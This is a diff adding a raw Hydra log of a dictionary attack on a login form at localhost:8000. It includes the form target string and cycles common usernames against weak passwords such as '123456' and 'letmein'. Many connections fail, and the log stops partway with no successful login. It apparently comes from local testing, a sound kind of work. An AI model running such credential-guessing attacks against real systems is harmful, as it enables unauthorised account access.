@@ -1,0 +1,609 @@
+===== Hydra dictionary attack against local server =====
+Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-11-01 19:01:22
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 255 login tries (l:17/p:15), ~16 tries per task
+[DATA] attacking http-post-form://localhost:8000/login:username=^USER^&password=^PASS^:F=Invalid
+[ATTEMPT] target localhost - login "root" - pass "123456" - 1 of 255 [child 0] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "password" - 2 of 255 [child 1] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "qwerty" - 3 of 255 [child 2] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "admin" - 4 of 255 [child 3] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "12345678" - 5 of 255 [child 4] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "111111" - 6 of 255 [child 5] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "iloveyou" - 7 of 255 [child 6] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "monkey" - 8 of 255 [child 7] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "dragon" - 9 of 255 [child 8] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "letmein" - 10 of 255 [child 9] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "football" - 11 of 255 [child 10] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "12345admin" - 12 of 255 [child 11] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "superman" - 13 of 255 [child 12] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "1q2w3e4r" - 14 of 255 [child 13] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "qwerty123" - 15 of 255 [child 14] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "123456" - 16 of 255 [child 15] (0/0)
+[ERROR] Child with pid 11307 terminating, cannot connect
+[ERROR] Child with pid 11308 terminating, cannot connect
+[ERROR] Child with pid 11309 terminating, cannot connect
+[ERROR] Child with pid 11310 terminating, cannot connect
+[ATTEMPT] target localhost - login "admin" - pass "password" - 17 of 257 [child 0] (0/2)
+[ERROR] Child with pid 11311 terminating, cannot connect
+[ERROR] Child with pid 11312 terminating, cannot connect
+[ATTEMPT] target localhost - login "admin" - pass "qwerty" - 18 of 259 [child 1] (0/4)
+[ERROR] Child with pid 11313 terminating, cannot connect
+[ERROR] Child with pid 11314 terminating, cannot connect
+[ERROR] Child with pid 11315 terminating, cannot connect
+[ERROR] Child with pid 11316 terminating, cannot connect
+[ATTEMPT] target localhost - login "admin" - pass "admin" - 19 of 261 [child 2] (0/6)
+[ATTEMPT] target localhost - login "admin" - pass "12345678" - 20 of 261 [child 3] (0/6)
+[ERROR] Child with pid 11317 terminating, cannot connect
+[ERROR] Child with pid 11318 terminating, cannot connect
+[ERROR] Child with pid 11319 terminating, cannot connect
+[ERROR] Child with pid 11320 terminating, cannot connect
+[ERROR] Child with pid 11321 terminating, cannot connect
+[ATTEMPT] target localhost - login "admin" - pass "111111" - 21 of 265 [child 4] (0/10)
+[ATTEMPT] target localhost - login "admin" - pass "iloveyou" - 22 of 265 [child 5] (0/10)
+[ERROR] Child with pid 11322 terminating, cannot connect
+[ATTEMPT] target localhost - login "admin" - pass "monkey" - 23 of 270 [child 6] (0/15)
+[ATTEMPT] target localhost - login "admin" - pass "dragon" - 24 of 270 [child 7] (0/15)
+[ATTEMPT] target localhost - login "admin" - pass "letmein" - 25 of 270 [child 8] (0/15)
+[ATTEMPT] target localhost - login "admin" - pass "football" - 26 of 270 [child 9] (0/15)
+[ATTEMPT] target localhost - login "admin" - pass "12345admin" - 27 of 271 [child 10] (0/16)
+[ATTEMPT] target localhost - login "admin" - pass "superman" - 28 of 271 [child 11] (0/16)
+[ATTEMPT] target localhost - login "admin" - pass "1q2w3e4r" - 29 of 271 [child 12] (0/16)
+[ATTEMPT] target localhost - login "admin" - pass "qwerty123" - 30 of 271 [child 13] (0/16)
+[ATTEMPT] target localhost - login "test" - pass "123456" - 31 of 271 [child 14] (0/16)
+[ATTEMPT] target localhost - login "test" - pass "password" - 32 of 271 [child 15] (0/16)
+[ERROR] Child with pid 11335 terminating, cannot connect
+[ERROR] Child with pid 11336 terminating, cannot connect
+[ATTEMPT] target localhost - login "test" - pass "qwerty" - 33 of 273 [child 0] (0/18)
+[ERROR] Child with pid 11337 terminating, cannot connect
+[ERROR] Child with pid 11338 terminating, cannot connect
+[ERROR] Child with pid 11339 terminating, cannot connect
+[ERROR] Child with pid 11340 terminating, cannot connect
+[ATTEMPT] target localhost - login "test" - pass "admin" - 34 of 273 [child 1] (0/18)
+[ERROR] Child with pid 11341 terminating, cannot connect
+[ERROR] Child with pid 11342 terminating, cannot connect
+[ERROR] Child with pid 11343 terminating, cannot connect
+[ERROR] Child with pid 11344 terminating, cannot connect
+[ATTEMPT] target localhost - login "test" - pass "12345678" - 35 of 278 [child 2] (0/23)
+[ATTEMPT] target localhost - login "test" - pass "111111" - 36 of 278 [child 3] (0/23)
+[ATTEMPT] target localhost - login "test" - pass "iloveyou" - 37 of 278 [child 4] (0/23)
+[ATTEMPT] target localhost - login "test" - pass "monkey" - 38 of 278 [child 5] (0/23)
+[ERROR] Child with pid 11345 terminating, cannot connect
+[ATTEMPT] target localhost - login "test" - pass "dragon" - 39 of 281 [child 6] (0/26)
+[ERROR] Child with pid 11346 terminating, cannot connect
+[ERROR] Child with pid 11347 terminating, cannot connect
+[ERROR] Child with pid 11348 terminating, cannot connect
+[ERROR] Child with pid 11349 terminating, cannot connect
+[ATTEMPT] target localhost - login "test" - pass "letmein" - 40 of 282 [child 7] (0/27)
+[ATTEMPT] target localhost - login "test" - pass "football" - 41 of 282 [child 8] (0/27)
+[ATTEMPT] target localhost - login "test" - pass "12345admin" - 42 of 282 [child 9] (0/27)
+[ATTEMPT] target localhost - login "test" - pass "superman" - 43 of 286 [child 10] (0/31)
+[ERROR] Child with pid 11350 terminating, cannot connect
+[ATTEMPT] target localhost - login "test" - pass "1q2w3e4r" - 44 of 286 [child 11] (0/31)
+[ATTEMPT] target localhost - login "test" - pass "qwerty123" - 45 of 286 [child 12] (0/31)
+[ATTEMPT] target localhost - login "guest" - pass "123456" - 46 of 286 [child 13] (0/31)
+[ATTEMPT] target localhost - login "guest" - pass "password" - 47 of 286 [child 14] (0/31)
+[ATTEMPT] target localhost - login "guest" - pass "qwerty" - 48 of 287 [child 15] (0/32)
+[ERROR] Child with pid 11362 terminating, cannot connect
+[ERROR] Child with pid 11363 terminating, cannot connect
+[ATTEMPT] target localhost - login "guest" - pass "admin" - 49 of 288 [child 0] (0/33)
+[ERROR] Child with pid 11364 terminating, cannot connect
+[ERROR] Child with pid 11365 terminating, cannot connect
+[ATTEMPT] target localhost - login "guest" - pass "12345678" - 50 of 288 [child 1] (0/33)
+[ERROR] Child with pid 11366 terminating, cannot connect
+[ERROR] Child with pid 11367 terminating, cannot connect
+[ERROR] Child with pid 11368 terminating, cannot connect
+[ATTEMPT] target localhost - login "guest" - pass "111111" - 51 of 288 [child 2] (0/33)
+[ATTEMPT] target localhost - login "guest" - pass "iloveyou" - 52 of 288 [child 3] (0/33)
+[ERROR] Child with pid 11369 terminating, cannot connect
+[ERROR] Child with pid 11370 terminating, cannot connect
+[ATTEMPT] target localhost - login "guest" - pass "monkey" - 53 of 288 [child 4] (0/33)
+[ERROR] Child with pid 11371 terminating, cannot connect
+[ERROR] Child with pid 11372 terminating, cannot connect
+[ERROR] Child with pid 11373 terminating, cannot connect
+[ATTEMPT] target localhost - login "guest" - pass "dragon" - 54 of 288 [child 5] (0/33)
+[ATTEMPT] target localhost - login "guest" - pass "letmein" - 55 of 288 [child 6] (0/33)
+[ERROR] Child with pid 11374 terminating, cannot connect
+[ERROR] Child with pid 11375 terminating, cannot connect
+[ERROR] Child with pid 11376 terminating, cannot connect
+[ATTEMPT] target localhost - login "guest" - pass "football" - 56 of 288 [child 7] (0/33)
+[ATTEMPT] target localhost - login "guest" - pass "12345admin" - 57 of 288 [child 8] (0/33)
+[ATTEMPT] target localhost - login "guest" - pass "superman" - 58 of 288 [child 9] (0/33)
+[ATTEMPT] target localhost - login "guest" - pass "1q2w3e4r" - 59 of 288 [child 10] (0/33)
+[ATTEMPT] target localhost - login "guest" - pass "qwerty123" - 60 of 288 [child 11] (0/33)
+[ATTEMPT] target localhost - login "info" - pass "123456" - 61 of 288 [child 12] (0/33)
+[ATTEMPT] target localhost - login "info" - pass "password" - 62 of 288 [child 13] (0/33)
+[ATTEMPT] target localhost - login "info" - pass "qwerty" - 63 of 288 [child 14] (0/33)
+[ERROR] Child with pid 11378 terminating, cannot connect
+[ATTEMPT] target localhost - login "info" - pass "admin" - 64 of 288 [child 15] (0/33)
+[ERROR] Child with pid 11392 terminating, cannot connect
+[ERROR] Child with pid 11393 terminating, cannot connect
+[ERROR] Child with pid 11395 terminating, cannot connect
+[ERROR] Child with pid 11394 terminating, cannot connect
+[ERROR] Child with pid 11396 terminating, cannot connect
+[ATTEMPT] target localhost - login "info" - pass "12345678" - 65 of 288 [child 0] (0/33)
+[ATTEMPT] target localhost - login "info" - pass "111111" - 66 of 288 [child 1] (0/33)
+[ERROR] Child with pid 11397 terminating, cannot connect
+[ERROR] Child with pid 11398 terminating, cannot connect
+[ATTEMPT] target localhost - login "info" - pass "iloveyou" - 67 of 288 [child 2] (0/33)
+[ATTEMPT] target localhost - login "info" - pass "monkey" - 68 of 288 [child 3] (0/33)
+[ATTEMPT] target localhost - login "info" - pass "dragon" - 69 of 288 [child 4] (0/33)
+[ERROR] Child with pid 11399 terminating, cannot connect
+[ERROR] Child with pid 11400 terminating, cannot connect
+[ERROR] Child with pid 11401 terminating, cannot connect
+[ERROR] Child with pid 11402 terminating, cannot connect
+[ERROR] Child with pid 11403 terminating, cannot connect
+[ATTEMPT] target localhost - login "info" - pass "letmein" - 70 of 288 [child 5] (0/33)
+[ATTEMPT] target localhost - login "info" - pass "football" - 71 of 288 [child 6] (0/33)
+[ERROR] Child with pid 11404 terminating, cannot connect
+[ERROR] Child with pid 11405 terminating, cannot connect
+[ERROR] Child with pid 11406 terminating, cannot connect
+[ATTEMPT] target localhost - login "info" - pass "12345admin" - 72 of 288 [child 7] (0/33)
+[ATTEMPT] target localhost - login "info" - pass "superman" - 73 of 288 [child 8] (0/33)
+[ATTEMPT] target localhost - login "info" - pass "1q2w3e4r" - 74 of 288 [child 9] (0/33)
+[ATTEMPT] target localhost - login "info" - pass "qwerty123" - 75 of 288 [child 10] (0/33)
+[ATTEMPT] target localhost - login "adm" - pass "123456" - 76 of 288 [child 11] (0/33)
+[ATTEMPT] target localhost - login "adm" - pass "password" - 77 of 288 [child 12] (0/33)
+[ATTEMPT] target localhost - login "adm" - pass "qwerty" - 78 of 288 [child 13] (0/33)
+[ATTEMPT] target localhost - login "adm" - pass "admin" - 79 of 288 [child 14] (0/33)
+[ERROR] Child with pid 11409 terminating, cannot connect
+[ATTEMPT] target localhost - login "adm" - pass "12345678" - 80 of 288 [child 15] (0/33)
+[ERROR] Child with pid 11420 terminating, cannot connect
+[ERROR] Child with pid 11421 terminating, cannot connect
+[ERROR] Child with pid 11422 terminating, cannot connect
+[ATTEMPT] target localhost - login "adm" - pass "111111" - 81 of 288 [child 0] (0/33)
+[ERROR] Child with pid 11423 terminating, cannot connect
+[ATTEMPT] target localhost - login "adm" - pass "iloveyou" - 82 of 288 [child 1] (0/33)
+[ERROR] Child with pid 11424 terminating, cannot connect
+[ATTEMPT] target localhost - login "adm" - pass "monkey" - 83 of 288 [child 2] (0/33)
+[ERROR] Child with pid 11425 terminating, cannot connect
+[ATTEMPT] target localhost - login "adm" - pass "dragon" - 84 of 288 [child 3] (0/33)
+[ERROR] Child with pid 11426 terminating, cannot connect
+[ATTEMPT] target localhost - login "adm" - pass "letmein" - 85 of 288 [child 4] (0/33)
+[ATTEMPT] target localhost - login "adm" - pass "football" - 86 of 288 [child 5] (0/33)
+[ERROR] Child with pid 11427 terminating, cannot connect
+[ATTEMPT] target localhost - login "adm" - pass "12345admin" - 87 of 288 [child 6] (0/33)
+[ERROR] Child with pid 11428 terminating, cannot connect
+[ERROR] Child with pid 11429 terminating, cannot connect
+[ATTEMPT] target localhost - login "adm" - pass "superman" - 88 of 288 [child 7] (0/33)
+[ERROR] Child with pid 11430 terminating, cannot connect
+[ATTEMPT] target localhost - login "adm" - pass "1q2w3e4r" - 89 of 288 [child 8] (0/33)
+[ATTEMPT] target localhost - login "adm" - pass "qwerty123" - 90 of 288 [child 9] (0/33)
+[ERROR] Child with pid 11431 terminating, cannot connect
+[ERROR] Child with pid 11432 terminating, cannot connect
+[ERROR] Child with pid 11433 terminating, cannot connect
+[ERROR] Child with pid 11434 terminating, cannot connect
+[ATTEMPT] target localhost - login "mysql" - pass "123456" - 91 of 288 [child 10] (0/33)
+[ATTEMPT] target localhost - login "mysql" - pass "password" - 92 of 288 [child 11] (0/33)
+[ATTEMPT] target localhost - login "mysql" - pass "qwerty" - 93 of 288 [child 12] (0/33)
+[ATTEMPT] target localhost - login "mysql" - pass "admin" - 94 of 288 [child 13] (0/33)
+[ATTEMPT] target localhost - login "mysql" - pass "12345678" - 95 of 288 [child 14] (0/33)
+[ERROR] Child with pid 11437 terminating, cannot connect
+[ATTEMPT] target localhost - login "mysql" - pass "111111" - 96 of 288 [child 15] (0/33)
+[ERROR] Child with pid 11447 terminating, cannot connect
+[ERROR] Child with pid 11448 terminating, cannot connect
+[ERROR] Child with pid 11449 terminating, cannot connect
+[ATTEMPT] target localhost - login "mysql" - pass "iloveyou" - 97 of 288 [child 0] (0/33)
+[ERROR] Child with pid 11450 terminating, cannot connect
+[ATTEMPT] target localhost - login "mysql" - pass "monkey" - 98 of 288 [child 1] (0/33)
+[ERROR] Child with pid 11451 terminating, cannot connect
+[ATTEMPT] target localhost - login "mysql" - pass "dragon" - 99 of 288 [child 2] (0/33)
+[ERROR] Child with pid 11452 terminating, cannot connect
+[ATTEMPT] target localhost - login "mysql" - pass "letmein" - 100 of 288 [child 3] (0/33)
+[ERROR] Child with pid 11453 terminating, cannot connect
+[ATTEMPT] target localhost - login "mysql" - pass "football" - 101 of 288 [child 4] (0/33)
+[ATTEMPT] target localhost - login "mysql" - pass "12345admin" - 102 of 288 [child 5] (0/33)
+[ERROR] Child with pid 11454 terminating, cannot connect
+[ERROR] Child with pid 11455 terminating, cannot connect
+[ERROR] Child with pid 11456 terminating, cannot connect
+[ATTEMPT] target localhost - login "mysql" - pass "superman" - 103 of 288 [child 6] (0/33)
+[ERROR] Child with pid 11457 terminating, cannot connect
+[ATTEMPT] target localhost - login "mysql" - pass "1q2w3e4r" - 104 of 288 [child 7] (0/33)
+[ATTEMPT] target localhost - login "mysql" - pass "qwerty123" - 105 of 288 [child 8] (0/33)
+[ATTEMPT] target localhost - login "user" - pass "123456" - 106 of 288 [child 9] (0/33)
+[ATTEMPT] target localhost - login "user" - pass "password" - 107 of 288 [child 10] (0/33)
+[ERROR] Child with pid 11459 terminating, cannot connect
+[ERROR] Child with pid 11460 terminating, cannot connect
+[ERROR] Child with pid 11461 terminating, cannot connect
+[ERROR] Child with pid 11462 terminating, cannot connect
+[ATTEMPT] target localhost - login "user" - pass "qwerty" - 108 of 288 [child 11] (0/33)
+[ATTEMPT] target localhost - login "user" - pass "admin" - 109 of 288 [child 12] (0/33)
+[ATTEMPT] target localhost - login "user" - pass "12345678" - 110 of 288 [child 13] (0/33)
+[ATTEMPT] target localhost - login "user" - pass "111111" - 111 of 288 [child 14] (0/33)
+[ERROR] Child with pid 11465 terminating, cannot connect
+[ATTEMPT] target localhost - login "user" - pass "iloveyou" - 112 of 288 [child 15] (0/33)
+[ERROR] Child with pid 11475 terminating, cannot connect
+[ERROR] Child with pid 11476 terminating, cannot connect
+[ATTEMPT] target localhost - login "user" - pass "monkey" - 113 of 288 [child 0] (0/33)
+[ERROR] Child with pid 11477 terminating, cannot connect
+[ERROR] Child with pid 11478 terminating, cannot connect
+[ERROR] Child with pid 11479 terminating, cannot connect
+[ATTEMPT] target localhost - login "user" - pass "dragon" - 114 of 288 [child 1] (0/33)
+[ERROR] Child with pid 11480 terminating, cannot connect
+[ERROR] Child with pid 11481 terminating, cannot connect
+[ATTEMPT] target localhost - login "user" - pass "letmein" - 115 of 288 [child 2] (0/33)
+[ATTEMPT] target localhost - login "user" - pass "football" - 116 of 288 [child 3] (0/33)
+[ATTEMPT] target localhost - login "user" - pass "12345admin" - 117 of 288 [child 4] (0/33)
+[ATTEMPT] target localhost - login "user" - pass "superman" - 118 of 288 [child 5] (0/33)
+[ERROR] Child with pid 11482 terminating, cannot connect
+[ATTEMPT] target localhost - login "user" - pass "1q2w3e4r" - 119 of 288 [child 6] (0/33)
+[ERROR] Child with pid 11483 terminating, cannot connect
+[ERROR] Child with pid 11484 terminating, cannot connect
+[ATTEMPT] target localhost - login "user" - pass "qwerty123" - 120 of 288 [child 7] (0/33)
+[ERROR] Child with pid 11485 terminating, cannot connect
+[ATTEMPT] target localhost - login "administrator" - pass "123456" - 121 of 288 [child 8] (0/33)
+[ATTEMPT] target localhost - login "administrator" - pass "password" - 122 of 288 [child 9] (0/33)
+[ATTEMPT] target localhost - login "administrator" - pass "qwerty" - 123 of 288 [child 10] (0/33)
+[ERROR] Child with pid 11487 terminating, cannot connect
+[ERROR] Child with pid 11488 terminating, cannot connect
+[ATTEMPT] target localhost - login "administrator" - pass "admin" - 124 of 288 [child 11] (0/33)
+[ERROR] Child with pid 11489 terminating, cannot connect
+[ERROR] Child with pid 11490 terminating, cannot connect
+[ATTEMPT] target localhost - login "administrator" - pass "12345678" - 125 of 288 [child 12] (0/33)
+[ATTEMPT] target localhost - login "administrator" - pass "111111" - 126 of 288 [child 13] (0/33)
+[ATTEMPT] target localhost - login "administrator" - pass "iloveyou" - 127 of 288 [child 14] (0/33)
+[ERROR] Child with pid 11494 terminating, cannot connect
+[ATTEMPT] target localhost - login "administrator" - pass "monkey" - 128 of 288 [child 15] (0/33)
+[ERROR] Child with pid 11502 terminating, cannot connect
+[ERROR] Child with pid 11503 terminating, cannot connect
+[ATTEMPT] target localhost - login "administrator" - pass "dragon" - 129 of 288 [child 0] (0/33)
+[ERROR] Child with pid 11504 terminating, cannot connect
+[ERROR] Child with pid 11505 terminating, cannot connect
+[ATTEMPT] target localhost - login "administrator" - pass "letmein" - 130 of 288 [child 1] (0/33)
+[ERROR] Child with pid 11506 terminating, cannot connect
+[ERROR] Child with pid 11507 terminating, cannot connect
+[ERROR] Child with pid 11508 terminating, cannot connect
+[ATTEMPT] target localhost - login "administrator" - pass "football" - 131 of 288 [child 2] (0/33)
+[ATTEMPT] target localhost - login "administrator" - pass "12345admin" - 132 of 288 [child 3] (0/33)
+[ATTEMPT] target localhost - login "administrator" - pass "superman" - 133 of 288 [child 4] (0/33)
+[ERROR] Child with pid 11509 terminating, cannot connect
+[ATTEMPT] target localhost - login "administrator" - pass "1q2w3e4r" - 134 of 288 [child 5] (0/33)
+[ATTEMPT] target localhost - login "administrator" - pass "qwerty123" - 135 of 288 [child 6] (0/33)
+[ERROR] Child with pid 11510 terminating, cannot connect
+[ERROR] Child with pid 11511 terminating, cannot connect
+[ATTEMPT] target localhost - login "oracle" - pass "123456" - 136 of 288 [child 7] (0/33)
+[ERROR] Child with pid 11512 terminating, cannot connect
+[ATTEMPT] target localhost - login "oracle" - pass "password" - 137 of 288 [child 8] (0/33)
+[ATTEMPT] target localhost - login "oracle" - pass "qwerty" - 138 of 288 [child 9] (0/33)
+[ERROR] Child with pid 11514 terminating, cannot connect
+[ERROR] Child with pid 11515 terminating, cannot connect
+[ATTEMPT] target localhost - login "oracle" - pass "admin" - 139 of 288 [child 10] (0/33)
+[ATTEMPT] target localhost - login "oracle" - pass "12345678" - 140 of 288 [child 11] (0/33)
+[ATTEMPT] target localhost - login "oracle" - pass "111111" - 141 of 288 [child 12] (0/33)
+[ERROR] Child with pid 11517 terminating, cannot connect
+[ERROR] Child with pid 11518 terminating, cannot connect
+[ATTEMPT] target localhost - login "oracle" - pass "iloveyou" - 142 of 288 [child 13] (0/33)
+[ATTEMPT] target localhost - login "oracle" - pass "monkey" - 143 of 288 [child 14] (0/33)
+[ERROR] Child with pid 11522 terminating, cannot connect
+[ATTEMPT] target localhost - login "oracle" - pass "dragon" - 144 of 288 [child 15] (0/33)
+[ERROR] Child with pid 11530 terminating, cannot connect
+[ERROR] Child with pid 11531 terminating, cannot connect
+[ATTEMPT] target localhost - login "oracle" - pass "letmein" - 145 of 288 [child 0] (0/33)
+[ERROR] Child with pid 11532 terminating, cannot connect
+[ATTEMPT] target localhost - login "oracle" - pass "football" - 146 of 288 [child 1] (0/33)
+[ERROR] Child with pid 11533 terminating, cannot connect
+[ATTEMPT] target localhost - login "oracle" - pass "12345admin" - 147 of 288 [child 2] (0/33)
+[ERROR] Child with pid 11534 terminating, cannot connect
+[ERROR] Child with pid 11535 terminating, cannot connect
+[ERROR] Child with pid 11536 terminating, cannot connect
+[ATTEMPT] target localhost - login "oracle" - pass "superman" - 148 of 288 [child 3] (0/33)
+[ERROR] Child with pid 11537 terminating, cannot connect
+[ERROR] Child with pid 11538 terminating, cannot connect
+[ERROR] Child with pid 11539 terminating, cannot connect
+[ATTEMPT] target localhost - login "oracle" - pass "1q2w3e4r" - 149 of 288 [child 4] (0/33)
+[ATTEMPT] target localhost - login "oracle" - pass "qwerty123" - 150 of 288 [child 5] (0/33)
+[ATTEMPT] target localhost - login "ftp" - pass "123456" - 151 of 288 [child 6] (0/33)
+[ATTEMPT] target localhost - login "ftp" - pass "password" - 152 of 288 [child 7] (0/33)
+[ATTEMPT] target localhost - login "ftp" - pass "qwerty" - 153 of 288 [child 8] (0/33)
+[ATTEMPT] target localhost - login "ftp" - pass "admin" - 154 of 288 [child 9] (0/33)
+[ERROR] Child with pid 11541 terminating, cannot connect
+[ERROR] Child with pid 11542 terminating, cannot connect
+[ATTEMPT] target localhost - login "ftp" - pass "12345678" - 155 of 288 [child 10] (0/33)
+[ERROR] Child with pid 11543 terminating, cannot connect
+[ATTEMPT] target localhost - login "ftp" - pass "111111" - 156 of 288 [child 11] (0/33)
+[ERROR] Child with pid 11545 terminating, cannot connect
+[ERROR] Child with pid 11546 terminating, cannot connect
+[ATTEMPT] target localhost - login "ftp" - pass "iloveyou" - 157 of 288 [child 12] (0/33)
+[ATTEMPT] target localhost - login "ftp" - pass "monkey" - 158 of 288 [child 13] (0/33)
+[ATTEMPT] target localhost - login "ftp" - pass "dragon" - 159 of 288 [child 14] (0/33)
+[ERROR] Child with pid 11550 terminating, cannot connect
+[ATTEMPT] target localhost - login "ftp" - pass "letmein" - 160 of 288 [child 15] (0/33)
+[ERROR] Child with pid 11557 terminating, cannot connect
+[ERROR] Child with pid 11558 terminating, cannot connect
+[ATTEMPT] target localhost - login "ftp" - pass "football" - 161 of 288 [child 0] (0/33)
+[ERROR] Child with pid 11559 terminating, cannot connect
+[ATTEMPT] target localhost - login "ftp" - pass "12345admin" - 162 of 288 [child 1] (0/33)
+[ERROR] Child with pid 11560 terminating, cannot connect
+[ATTEMPT] target localhost - login "ftp" - pass "superman" - 163 of 288 [child 2] (0/33)
+[ATTEMPT] target localhost - login "ftp" - pass "1q2w3e4r" - 164 of 288 [child 3] (0/33)
+[ERROR] Child with pid 11562 terminating, cannot connect
+[ERROR] Child with pid 11563 terminating, cannot connect
+[ERROR] Child with pid 11564 terminating, cannot connect
+[ERROR] Child with pid 11565 terminating, cannot connect
+[ATTEMPT] target localhost - login "ftp" - pass "qwerty123" - 165 of 288 [child 4] (0/33)
+[ATTEMPT] target localhost - login "pi" - pass "123456" - 166 of 288 [child 5] (0/33)
+[ERROR] Child with pid 11566 terminating, cannot connect
+[ERROR] Child with pid 11567 terminating, cannot connect
+[ATTEMPT] target localhost - login "pi" - pass "password" - 167 of 288 [child 6] (0/33)
+[ATTEMPT] target localhost - login "pi" - pass "qwerty" - 168 of 288 [child 7] (0/33)
+[ATTEMPT] target localhost - login "pi" - pass "admin" - 169 of 288 [child 8] (0/33)
+[ATTEMPT] target localhost - login "pi" - pass "12345678" - 170 of 288 [child 9] (0/33)
+[ERROR] Child with pid 11568 terminating, cannot connect
+[ERROR] Child with pid 11569 terminating, cannot connect
+[ATTEMPT] target localhost - login "pi" - pass "111111" - 171 of 288 [child 10] (0/33)
+[ATTEMPT] target localhost - login "pi" - pass "iloveyou" - 172 of 288 [child 11] (0/33)
+[ERROR] Child with pid 11571 terminating, cannot connect
+[ERROR] Child with pid 11572 terminating, cannot connect
+[ERROR] Child with pid 11573 terminating, cannot connect
+[ATTEMPT] target localhost - login "pi" - pass "monkey" - 173 of 288 [child 12] (0/33)
+[ATTEMPT] target localhost - login "pi" - pass "dragon" - 174 of 288 [child 13] (0/33)
+[ATTEMPT] target localhost - login "pi" - pass "letmein" - 175 of 288 [child 14] (0/33)
+[ERROR] Child with pid 11579 terminating, cannot connect
+[ATTEMPT] target localhost - login "pi" - pass "football" - 176 of 288 [child 15] (0/33)
+[ERROR] Child with pid 11585 terminating, cannot connect
+[ERROR] Child with pid 11586 terminating, cannot connect
+[ATTEMPT] target localhost - login "pi" - pass "12345admin" - 177 of 288 [child 0] (0/33)
+[ERROR] Child with pid 11587 terminating, cannot connect
+[ATTEMPT] target localhost - login "pi" - pass "superman" - 178 of 288 [child 1] (0/33)
+[ERROR] Child with pid 11588 terminating, cannot connect
+[ATTEMPT] target localhost - login "pi" - pass "1q2w3e4r" - 179 of 288 [child 2] (0/33)
+[ATTEMPT] target localhost - login "pi" - pass "qwerty123" - 180 of 288 [child 3] (0/33)
+[ERROR] Child with pid 11589 terminating, cannot connect
+[ERROR] Child with pid 11590 terminating, cannot connect
+[ERROR] Child with pid 11591 terminating, cannot connect
+[ERROR] Child with pid 11592 terminating, cannot connect
+[ATTEMPT] target localhost - login "puppet" - pass "123456" - 181 of 288 [child 4] (0/33)
+[ATTEMPT] target localhost - login "puppet" - pass "password" - 182 of 288 [child 5] (0/33)
+[ERROR] Child with pid 11593 terminating, cannot connect
+[ERROR] Child with pid 11594 terminating, cannot connect
+[ATTEMPT] target localhost - login "puppet" - pass "qwerty" - 183 of 288 [child 6] (0/33)
+[ATTEMPT] target localhost - login "puppet" - pass "admin" - 184 of 288 [child 7] (0/33)
+[ATTEMPT] target localhost - login "puppet" - pass "12345678" - 185 of 288 [child 8] (0/33)
+[ATTEMPT] target localhost - login "puppet" - pass "111111" - 186 of 288 [child 9] (0/33)
+[ERROR] Child with pid 11596 terminating, cannot connect
+[ERROR] Child with pid 11597 terminating, cannot connect
+[ATTEMPT] target localhost - login "puppet" - pass "iloveyou" - 187 of 288 [child 10] (0/33)
+[ATTEMPT] target localhost - login "puppet" - pass "monkey" - 188 of 288 [child 11] (0/33)
+[ERROR] Child with pid 11599 terminating, cannot connect
+[ERROR] Child with pid 11600 terminating, cannot connect
+[ATTEMPT] target localhost - login "puppet" - pass "dragon" - 189 of 288 [child 12] (0/33)
+[ATTEMPT] target localhost - login "puppet" - pass "letmein" - 190 of 288 [child 13] (0/33)
+[ERROR] Child with pid 11602 terminating, cannot connect
+[ATTEMPT] target localhost - login "puppet" - pass "football" - 191 of 288 [child 14] (0/33)
+[ERROR] Child with pid 11607 terminating, cannot connect
+[ATTEMPT] target localhost - login "puppet" - pass "12345admin" - 192 of 288 [child 15] (0/33)
+[ERROR] Child with pid 11613 terminating, cannot connect
+[ERROR] Child with pid 11614 terminating, cannot connect
+[ATTEMPT] target localhost - login "puppet" - pass "superman" - 193 of 288 [child 0] (0/33)
+[ATTEMPT] target localhost - login "puppet" - pass "1q2w3e4r" - 194 of 288 [child 1] (0/33)
+[ERROR] Child with pid 11615 terminating, cannot connect
+[ERROR] Child with pid 11616 terminating, cannot connect
+[ERROR] Child with pid 11617 terminating, cannot connect
+[ERROR] Child with pid 11618 terminating, cannot connect
+[ERROR] Child with pid 11619 terminating, cannot connect
+[ATTEMPT] target localhost - login "puppet" - pass "qwerty123" - 195 of 288 [child 2] (0/33)
+[ATTEMPT] target localhost - login "ansible" - pass "123456" - 196 of 288 [child 3] (0/33)
+[ATTEMPT] target localhost - login "ansible" - pass "password" - 197 of 288 [child 4] (0/33)
+[ERROR] Child with pid 11620 terminating, cannot connect
+[ERROR] Child with pid 11621 terminating, cannot connect
+[ERROR] Child with pid 11622 terminating, cannot connect
+[ATTEMPT] target localhost - login "ansible" - pass "qwerty" - 198 of 288 [child 5] (0/33)
+[ATTEMPT] target localhost - login "ansible" - pass "admin" - 199 of 288 [child 6] (0/33)
+[ERROR] Child with pid 11624 terminating, cannot connect
+[ERROR] Child with pid 11625 terminating, cannot connect
+[ATTEMPT] target localhost - login "ansible" - pass "12345678" - 200 of 288 [child 7] (0/33)
+[ATTEMPT] target localhost - login "ansible" - pass "111111" - 201 of 288 [child 8] (0/33)
+[ATTEMPT] target localhost - login "ansible" - pass "iloveyou" - 202 of 288 [child 9] (0/33)
+[ATTEMPT] target localhost - login "ansible" - pass "monkey" - 203 of 288 [child 10] (0/33)
+[ATTEMPT] target localhost - login "ansible" - pass "dragon" - 204 of 288 [child 11] (0/33)
+[ERROR] Child with pid 11626 terminating, cannot connect
+[ERROR] Child with pid 11627 terminating, cannot connect
+[ATTEMPT] target localhost - login "ansible" - pass "letmein" - 205 of 288 [child 12] (0/33)
+[ATTEMPT] target localhost - login "ansible" - pass "football" - 206 of 288 [child 13] (0/33)
+[ERROR] Child with pid 11630 terminating, cannot connect
